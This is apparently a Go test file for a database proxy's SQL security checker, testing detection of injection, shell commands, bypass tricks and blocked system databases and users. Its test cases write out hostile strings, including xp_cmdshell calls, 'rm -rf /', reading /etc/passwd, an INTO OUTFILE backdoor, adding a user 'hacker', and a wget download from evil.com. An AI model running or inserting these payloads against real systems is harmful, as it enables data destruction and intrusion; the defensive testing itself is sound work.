package security

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"github.com/go-redis/redis/v8"
	"github.com/go-redis/redismock/v8"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestComprehensiveSecurityValidation tests the complete security validation pipeline
func TestComprehensiveSecurityValidation(t *testing.T) {
	tests := []struct {
		name           string
		query          string
		database       string
		table          string
		username       string
		expectedBlock  bool
		expectedType   string
		expectedReason string
	}{
		// SQL Injection Tests
		{
			name:          "Classic OR injection",
			query:         "SELECT * FROM users WHERE id = 1 OR 1=1",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "Union-based injection",
			query:         "SELECT id FROM users UNION SELECT password FROM admin",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "Comment-based injection",
			query:         "SELECT * FROM users WHERE id = 1 -- AND password = 'secret'",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "Stacked query injection",
			query:         "SELECT * FROM users; DROP TABLE logs;",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		
		// Shell Command Tests
		{
			name:          "SQL Server xp_cmdshell",
			query:         "SELECT * FROM users; EXEC xp_cmdshell 'whoami'",
			expectedBlock: true,
			expectedType:  "shell_command",
		},
		{
			name:          "MySQL system function",
			query:         "SELECT system('ls -la')",
			expectedBlock: true,
			expectedType:  "shell_command",
		},
		{
			name:          "PowerShell execution",
			query:         "SELECT * FROM users; powershell Get-Process",
			expectedBlock: true,
			expectedType:  "shell_command",
		},
		{
			name:          "Bash command injection",
			query:         "SELECT * FROM users WHERE name = 'test'; bash -c 'rm -rf /'",
			expectedBlock: true,
			expectedType:  "shell_command",
		},
		
		// File System Access Tests
		{
			name:          "File read operation",
			query:         "SELECT LOAD_FILE('/etc/passwd')",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "File write operation",
			query:         "SELECT 'malicious' INTO OUTFILE '/tmp/backdoor.php'",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "Bulk insert operation",
			query:         "BULK INSERT users FROM 'c:\\temp\\malicious_users.txt'",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		
		// Information Disclosure Tests
		{
			name:          "Database version disclosure",
			query:         "SELECT @@version",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "Information schema access",
			query:         "SELECT * FROM information_schema.tables",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "System database access",
			query:         "SELECT * FROM master.dbo.sysdatabases",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		
		// Encoding and Obfuscation Tests
		{
			name:          "Hex-encoded values",
			query:         "SELECT * FROM users WHERE name = 0x41646d696e",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "Character function bypass",
			query:         "SELECT * FROM users WHERE name = CHAR(65,68,77,73,78)",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		
		// Time-based Attacks
		{
			name:          "SQL Server WAITFOR delay",
			query:         "SELECT * FROM users WHERE id = 1; WAITFOR DELAY '00:00:05'",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		{
			name:          "MySQL SLEEP function",
			query:         "SELECT * FROM users WHERE id = 1 AND SLEEP(5)",
			expectedBlock: true,
			expectedType:  "sql_injection",
		},
		
		// Clean Queries (should not be blocked)
		{
			name:          "Clean SELECT query",
			query:         "SELECT id, name, email FROM customers WHERE active = 1",
			expectedBlock: false,
		},
		{
			name:          "Clean UPDATE query",
			query:         "UPDATE products SET price = 19.99 WHERE category = 'electronics'",
			expectedBlock: false,
		},
		{
			name:          "Clean INSERT query",
			query:         "INSERT INTO orders (customer_id, total) VALUES (123, 99.99)",
			expectedBlock: false,
		},
	}

	checker := NewSQLChecker(true, nil)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, attackType, reason := checker.IsSQLInjectionWithDetails(tt.query)
			
			assert.Equal(t, tt.expectedBlock, blocked,
				"Expected block status: %v, got: %v for query: %s", 
				tt.expectedBlock, blocked, tt.query)
			
			if tt.expectedBlock {
				assert.NotEmpty(t, attackType, "Attack type should not be empty for blocked query")
				assert.NotEmpty(t, reason, "Reason should not be empty for blocked query")
				
				if tt.expectedType != "" {
					assert.Equal(t, tt.expectedType, attackType,
						"Expected attack type: %s, got: %s", tt.expectedType, attackType)
				}
			}
		})
	}
}

// TestAdvancedSQLInjectionPatterns tests advanced SQL injection patterns
func TestAdvancedSQLInjectionPatterns(t *testing.T) {
	checker := NewSQLChecker(true, nil)

	advancedAttacks := []struct {
		name        string
		query       string
		description string
	}{
		{
			name:        "Double encoding attack",
			query:       "SELECT * FROM users WHERE id = %2527%2520OR%25201%253D1",
			description: "URL double-encoded SQL injection",
		},
		{
			name:        "Nested function attack",
			query:       "SELECT * FROM users WHERE id = (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1/0) END)",
			description: "Nested conditional SQL injection",
		},
		{
			name:        "XML function exploitation",
			query:       "SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))",
			description: "XML function-based error injection",
		},
		{
			name:        "Regex function abuse",
			query:       "SELECT * FROM users WHERE email REGEXP '^[a-zA-Z0-9]+(select|union|drop)'",
			description: "Regex function SQL injection",
		},
		{
			name:        "JSON function exploitation",
			query:       "SELECT JSON_EXTRACT(credentials, '$.password') FROM users WHERE JSON_CONTAINS(roles, '\"admin\"')",
			description: "JSON function potential data extraction",
		},
		{
			name:        "Window function abuse",
			query:       "SELECT *, ROW_NUMBER() OVER (ORDER BY (SELECT password FROM admin LIMIT 1)) FROM users",
			description: "Window function with subquery injection",
		},
		{
			name:        "CTE injection",
			query:       "WITH malicious AS (SELECT * FROM information_schema.tables) SELECT * FROM malicious",
			description: "Common Table Expression injection",
		},
		{
			name:        "Recursive CTE attack",
			query:       "WITH RECURSIVE bomb(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM bomb WHERE x < 1000000) SELECT * FROM bomb",
			description: "Recursive CTE denial of service",
		},
	}

	for _, attack := range advancedAttacks {
		t.Run(attack.name, func(t *testing.T) {
			blocked := checker.IsSQLInjection(attack.query)
			
			// Most advanced attacks should be detected
			// Some might pass depending on the complexity of pattern matching
			if !blocked {
				t.Logf("Advanced attack not detected (may be acceptable): %s - %s", 
					attack.name, attack.description)
			}
		})
	}
}

// TestShellCommandDetectionComprehensive tests comprehensive shell command detection
func TestShellCommandDetectionComprehensive(t *testing.T) {
	checker := NewSQLChecker(true, nil)

	shellCommands := []struct {
		name     string
		query    string
		platform string
	}{
		// Windows Commands
		{
			name:     "Windows command prompt",
			query:    "SELECT * FROM users; cmd.exe /c dir",
			platform: "windows",
		},
		{
			name:     "Windows PowerShell execution",
			query:    "SELECT * FROM users; powershell -Command 'Get-Service'",
			platform: "windows",
		},
		{
			name:     "Windows registry access",
			query:    "SELECT * FROM users; reg query HKLM\\Software",
			platform: "windows",
		},
		{
			name:     "Windows service manipulation",
			query:    "SELECT * FROM users; sc create backdoor binpath= 'c:\\backdoor.exe'",
			platform: "windows",
		},
		{
			name:     "Windows user management",
			query:    "SELECT * FROM users; net user hacker password123 /add",
			platform: "windows",
		},
		{
			name:     "Windows WMI execution",
			query:    "SELECT * FROM users; wmic process call create 'calc.exe'",
			platform: "windows",
		},

		// Unix/Linux Commands
		{
			name:     "Bash shell execution",
			query:    "SELECT * FROM users; /bin/bash -c 'whoami'",
			platform: "unix",
		},
		{
			name:     "File system manipulation",
			query:    "SELECT * FROM users; rm -rf /important/data",
			platform: "unix",
		},
		{
			name:     "Process control",
			query:    "SELECT * FROM users; kill -9 $(pgrep mysql)",
			platform: "unix",
		},
		{
			name:     "Network operations",
			query:    "SELECT * FROM users; wget http://evil.com/malware",
			platform: "unix",
		},
		{
			name:     "Privilege escalation",
			query:    "SELECT * FROM users; sudo su - root",
			platform: "unix",
		},
		{
			name:     "Cron job manipulation",
			query:    "SELECT * FROM users; crontab -e",
			platform: "unix",
		},

		// Cross-platform Commands
		{
			name:     "Python execution",
			query:    "SELECT * FROM users; python -c 'import os; os.system(\"rm -rf /\")'",
			platform: "cross",
		},
		{
			name:     "Perl execution",
			query:    "SELECT * FROM users; perl -e 'system(\"whoami\")'",
			platform: "cross",
		},
		{
			name:     "Node.js execution",
			query:    "SELECT * FROM users; node -e 'require(\"child_process\").exec(\"whoami\")'",
			platform: "cross",
		},
	}

	for _, cmd := range shellCommands {
		t.Run(cmd.name, func(t *testing.T) {
			isShell := checker.IsShellCommand(cmd.query)
			blocked, attackType, _ := checker.IsSQLInjectionWithDetails(cmd.query)

			// All shell commands should be detected
			assert.True(t, isShell, "Shell command should be detected: %s", cmd.query)
			assert.True(t, blocked, "Shell command should be blocked: %s", cmd.query)
			assert.Equal(t, "shell_command", attackType, "Attack type should be shell_command")
		})
	}
}

// TestBlockedDatabaseIntegration tests the complete blocked database integration
func TestBlockedDatabaseIntegration(t *testing.T) {
	db, mock := redismock.NewClientMock()
	ctx := context.Background()

	checker := &SQLChecker{
		enabled: true,
		redis:   db,
	}

	// Comprehensive blocked database configuration
	blockedData := map[string]BlockedDatabase{
		// System Databases
		"sql_server_master": {
			Name:    "master",
			Type:    "database",
			Pattern: "^master$",
			Reason:  "SQL Server system database",
			Active:  true,
		},
		"mysql_system": {
			Name:    "mysql",
			Type:    "database",
			Pattern: "^mysql$",
			Reason:  "MySQL system database",
			Active:  true,
		},
		"postgres_default": {
			Name:    "postgres",
			Type:    "database",
			Pattern: "^postgres$",
			Reason:  "PostgreSQL default database",
			Active:  true,
		},
		"mongodb_admin": {
			Name:    "admin",
			Type:    "database",
			Pattern: "^admin$",
			Reason:  "MongoDB admin database",
			Active:  true,
		},

		// Test Databases (Pattern-based)
		"test_pattern": {
			Name:    "test_databases",
			Type:    "database",
			Pattern: "^test.*",
			Reason:  "Test databases not allowed in production",
			Active:  true,
		},
		"demo_pattern": {
			Name:    "demo_databases",
			Type:    "database",
			Pattern: ".*demo.*",
			Reason:  "Demo databases blocked",
			Active:  true,
		},

		// System Users
		"root_user": {
			Name:    "root",
			Type:    "username",
			Pattern: "^root$",
			Reason:  "Default root account blocked",
			Active:  true,
		},
		"admin_user": {
			Name:    "admin",
			Type:    "username",
			Pattern: "^admin$",
			Reason:  "Default admin account blocked",
			Active:  true,
		},
		"sa_user": {
			Name:    "sa",
			Type:    "username",
			Pattern: "^sa$",
			Reason:  "SQL Server default admin blocked",
			Active:  true,
		},

		// Admin Pattern
		"admin_pattern": {
			Name:    "admin_users",
			Type:    "username",
			Pattern: ".*admin.*",
			Reason:  "Admin-like usernames blocked",
			Active:  true,
		},

		// System Tables
		"system_tables": {
			Name:    "system_tables",
			Type:    "table",
			Pattern: "^sys.*",
			Reason:  "System tables blocked",
			Active:  true,
		},
		"mysql_user_table": {
			Name:    "mysql_user",
			Type:    "table",
			Pattern: "^mysql\\.user$",
			Reason:  "MySQL user table blocked",
			Active:  true,
		},
		"information_schema": {
			Name:    "information_schema",
			Type:    "table",
			Pattern: "^information_schema\\..*",
			Reason:  "Information schema tables blocked",
			Active:  true,
		},

		// Inactive Rule (should be ignored)
		"inactive_rule": {
			Name:    "inactive",
			Type:    "database",
			Pattern: "^inactive$",
			Reason:  "Inactive rule for testing",
			Active:  false,
		},
	}

	blockedJSON, _ := json.Marshal(blockedData)

	testCases := []struct {
		name           string
		database       string
		table          string
		username       string
		expectedBlock  bool
		expectedReason string
	}{
		// System Database Tests
		{
			name:           "SQL Server master database",
			database:       "master",
			expectedBlock:  true,
			expectedReason: "SQL Server system database",
		},
		{
			name:           "MySQL system database",
			database:       "mysql",
			expectedBlock:  true,
			expectedReason: "MySQL system database",
		},
		{
			name:           "PostgreSQL default database",
			database:       "postgres",
			expectedBlock:  true,
			expectedReason: "PostgreSQL default database",
		},
		{
			name:           "MongoDB admin database",
			database:       "admin",
			expectedBlock:  true,
			expectedReason: "MongoDB admin database",
		},

		// Pattern-based Database Tests
		{
			name:           "Test database pattern",
			database:       "test_development",
			expectedBlock:  true,
			expectedReason: "Test databases not allowed in production",
		},
		{
			name:           "Demo database pattern",
			database:       "app_demo_v2",
			expectedBlock:  true,
			expectedReason: "Demo databases blocked",
		},

		// User Tests
		{
			name:           "Root user",
			username:       "root",
			expectedBlock:  true,
			expectedReason: "Default root account blocked",
		},
		{
			name:           "Admin user",
			username:       "admin",
			expectedBlock:  true,
			expectedReason: "Default admin account blocked",
		},
		{
			name:           "SA user",
			username:       "sa",
			expectedBlock:  true,
			expectedReason: "SQL Server default admin blocked",
		},
		{
			name:           "Admin pattern user",
			username:       "superadmin",
			expectedBlock:  true,
			expectedReason: "Admin-like usernames blocked",
		},

		// Table Tests
		{
			name:           "System table pattern",
			table:          "syscolumns",
			expectedBlock:  true,
			expectedReason: "System tables blocked",
		},
		{
			name:           "MySQL user table",
			table:          "mysql.user",
			expectedBlock:  true,
			expectedReason: "MySQL user table blocked",
		},
		{
			name:           "Information schema table",
			table:          "information_schema.tables",
			expectedBlock:  true,
			expectedReason: "Information schema tables blocked",
		},

		// Allowed Resources
		{
			name:         "Allowed database",
			database:     "production_app",
			expectedBlock: false,
		},
		{
			name:         "Allowed user",
			username:     "app_user",
			expectedBlock: false,
		},
		{
			name:         "Allowed table",
			table:        "customer_orders",
			expectedBlock: false,
		},

		// Inactive Rule Test
		{
			name:         "Inactive blocking rule",
			database:     "inactive",
			expectedBlock: false,
		},

		// Case Sensitivity Tests
		{
			name:           "Case insensitive database match",
			database:       "MASTER",
			expectedBlock:  true,
			expectedReason: "SQL Server system database",
		},
		{
			name:           "Case insensitive user match",
			username:       "ROOT",
			expectedBlock:  true,
			expectedReason: "Default root account blocked",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			mock.ExpectGet("articdbm:blocked_databases").SetVal(string(blockedJSON))

			blocked, reason := checker.IsBlockedDatabase(ctx, tc.database, tc.table, tc.username)

			assert.Equal(t, tc.expectedBlock, blocked,
				"Expected block status: %v, got: %v for test case: %s",
				tc.expectedBlock, blocked, tc.name)

			if tc.expectedBlock && tc.expectedReason != "" {
				assert.Equal(t, tc.expectedReason, reason,
					"Expected reason: %s, got: %s", tc.expectedReason, reason)
			}

			if !tc.expectedBlock {
				assert.Empty(t, reason, "Reason should be empty for allowed resources")
			}
		})
	}

	assert.NoError(t, mock.ExpectationsWereMet())
}

// TestSecurityPerformance tests the performance of security validation
func TestSecurityPerformance(t *testing.T) {
	checker := NewSQLChecker(true, nil)

	// Performance test queries
	queries := []string{
		"SELECT * FROM users WHERE id = 1 OR 1=1",
		"SELECT system('whoami')",
		"SELECT * FROM information_schema.tables",
		"SELECT LOAD_FILE('/etc/passwd')",
		"SELECT * FROM master.dbo.sysdatabases",
	}

	// Warm up
	for _, query := range queries {
		checker.IsSQLInjection(query)
	}

	// Performance test
	iterations := 1000
	start := time.Now()

	for i := 0; i < iterations; i++ {
		for _, query := range queries {
			checker.IsSQLInjection(query)
		}
	}

	elapsed := time.Since(start)
	avgTime := elapsed / time.Duration(iterations*len(queries))

	// Should process queries quickly (< 1ms per query on average)
	assert.Less(t, avgTime, time.Millisecond,
		"Average query processing time too slow: %v", avgTime)

	t.Logf("Performance: %d queries processed in %v (avg: %v per query)",
		iterations*len(queries), elapsed, avgTime)
}

// TestConcurrentSecurityValidation tests concurrent security validation
func TestConcurrentSecurityValidation(t *testing.T) {
	checker := NewSQLChecker(true, nil)

	queries := []string{
		"SELECT * FROM users WHERE id = 1 OR 1=1",
		"SELECT system('whoami')",
		"SELECT * FROM information_schema.tables",
		"SELECT * FROM users; xp_cmdshell 'dir'",
	}

	const numGoroutines = 10
	const queriesPerGoroutine = 100

	// Channel to collect results
	results := make(chan bool, numGoroutines*queriesPerGoroutine*len(queries))

	// Start concurrent validation
	for i := 0; i < numGoroutines; i++ {
		go func() {
			for j := 0; j < queriesPerGoroutine; j++ {
				for _, query := range queries {
					blocked := checker.IsSQLInjection(query)
					results <- blocked
				}
			}
		}()
	}

	// Collect results
	blockedCount := 0
	totalQueries := numGoroutines * queriesPerGoroutine * len(queries)

	for i := 0; i < totalQueries; i++ {
		if <-results {
			blockedCount++
		}
	}

	// All test queries should be blocked
	assert.Equal(t, totalQueries, blockedCount,
		"All dangerous queries should be blocked in concurrent test")

	t.Logf("Concurrent test: %d queries processed by %d goroutines",
		totalQueries, numGoroutines)
}

// TestSecurityBypass tests potential security bypass attempts
func TestSecurityBypass(t *testing.T) {
	checker := NewSQLChecker(true, nil)

	bypassAttempts := []struct {
		name  string
		query string
	}{
		{
			name:  "Case variation bypass",
			query: "SeLeCt * FrOm UsErS WhErE Id = 1 oR 1=1",
		},
		{
			name:  "Whitespace bypass",
			query: "SELECT/**//**/FROM/**/users/**/WHERE/**/id=1/**/OR/**/1=1",
		},
		{
			name:  "Tab and newline bypass",
			query: "SELECT\t*\nFROM\r\nusers\tWHERE\nid=1\tOR\t1=1",
		},
		{
			name:  "Mixed quote bypass",
			query: `SELECT * FROM users WHERE id = 1 OR "1"="1"`,
		},
		{
			name:  "Nested comment bypass",
			query: "SELECT * FROM users WHERE id = 1 /*OR 1=1*/ OR /*comment*/ 1=1",
		},
		{
			name:  "Unicode bypass attempt",
			query: "SELECT * FROM users WHERE id = 1 ＯＲ 1=1",
		},
		{
			name:  "Encoded space bypass",
			query: "SELECT%20*%20FROM%20users%20WHERE%20id%20=%201%20OR%201=1",
		},
	}

	for _, attempt := range bypassAttempts {
		t.Run(attempt.name, func(t *testing.T) {
			blocked := checker.IsSQLInjection(attempt.query)
			assert.True(t, blocked,
				"Bypass attempt should be blocked: %s - %s",
				attempt.name, attempt.query)
		})
	}
}

// TestErrorHandling tests error handling in security validation
func TestErrorHandling(t *testing.T) {
	// Test with nil redis client
	checker := NewSQLChecker(true, nil)
	ctx := context.Background()

	// Should not crash with nil redis
	blocked, reason := checker.IsBlockedDatabase(ctx, "test", "", "")
	assert.False(t, blocked, "Should return false when redis is nil")
	assert.Empty(t, reason, "Should return empty reason when redis is nil")

	// Test with disabled checker
	disabledChecker := NewSQLChecker(false, nil)

	testQueries := []string{
		"SELECT * FROM users WHERE id = 1 OR 1=1",
		"SELECT system('whoami')",
		"SELECT * FROM users; xp_cmdshell 'dir'",
	}

	for _, query := range testQueries {
		blocked := disabledChecker.IsSQLInjection(query)
		assert.False(t, blocked,
			"Disabled checker should not block queries: %s", query)

		shellBlocked := disabledChecker.IsShellCommand(query)
		assert.False(t, shellBlocked,
			"Disabled checker should not detect shell commands: %s", query)

		detailedBlocked, attackType, reason := disabledChecker.IsSQLInjectionWithDetails(query)
		assert.False(t, detailedBlocked, "Disabled checker should not block")
		assert.Empty(t, attackType, "Attack type should be empty")
		assert.Empty(t, reason, "Reason should be empty")
	}
}

// TestWriteQueryDetection tests write query detection
func TestWriteQueryDetection(t *testing.T) {
	writeQueries := []struct {
		query    string
		isWrite  bool
		category string
	}{
		{"SELECT * FROM users", false, "read"},
		{"INSERT INTO users VALUES (1, 'John')", true, "insert"},
		{"UPDATE users SET name = 'Jane' WHERE id = 1", true, "update"},
		{"DELETE FROM users WHERE id = 1", true, "delete"},
		{"CREATE TABLE test (id INT)", true, "ddl"},
		{"DROP TABLE test", true, "ddl"},
		{"ALTER TABLE users ADD COLUMN email VARCHAR(100)", true, "ddl"},
		{"TRUNCATE TABLE logs", true, "truncate"},
		{"GRANT SELECT ON users TO app_user", true, "dcl"},
		{"REVOKE DELETE ON users FROM app_user", true, "dcl"},
		{"BEGIN TRANSACTION", true, "transaction"},
		{"COMMIT", true, "transaction"},
		{"ROLLBACK", true, "transaction"},
		{"CALL stored_procedure()", true, "procedure"},
		{"EXEC sp_who", true, "procedure"},
		{"MERGE INTO target USING source ON (condition)", true, "merge"},
		{"REPLACE INTO users VALUES (1, 'John')", true, "replace"},
		{"LOCK TABLES users WRITE", true, "lock"},
	}

	for _, test := range writeQueries {
		t.Run(test.category+"_"+test.query[:min(20, len(test.query))], func(t *testing.T) {
			isWrite := IsWriteQuery(test.query)
			assert.Equal(t, test.isWrite, isWrite,
				"Query categorization mismatch for: %s", test.query)
		})
	}
}

// Helper function for min (Go 1.21+)
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// BenchmarkSQLInjectionDetection benchmarks SQL injection detection
func BenchmarkSQLInjectionDetection(b *testing.B) {
	checker := NewSQLChecker(true, nil)
	query := "SELECT * FROM users WHERE id = 1 AND name = 'test' OR 1=1"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		checker.IsSQLInjection(query)
	}
}

// BenchmarkShellCommandDetection benchmarks shell command detection
func BenchmarkShellCommandDetection(b *testing.B) {
	checker := NewSQLChecker(true, nil)
	query := "SELECT * FROM users; xp_cmdshell 'whoami'"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		checker.IsShellCommand(query)
	}
}

// BenchmarkBlockedDatabaseCheck benchmarks blocked database checking
func BenchmarkBlockedDatabaseCheck(b *testing.B) {
	db, mock := redismock.NewClientMock()
	ctx := context.Background()

	checker := &SQLChecker{
		enabled: true,
		redis:   db,
	}

	blockedData := map[string]BlockedDatabase{
		"test_db": {
			Name:    "test",
			Type:    "database",
			Pattern: "^test$",
			Reason:  "Test database blocked",
			Active:  true,
		},
	}

	blockedJSON, _ := json.Marshal(blockedData)
	
	// Set up expectation for multiple calls
	for i := 0; i < b.N; i++ {
		mock.ExpectGet("articdbm:blocked_databases").SetVal(string(blockedJSON))
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		checker.IsBlockedDatabase(ctx, "test", "", "")
	}
}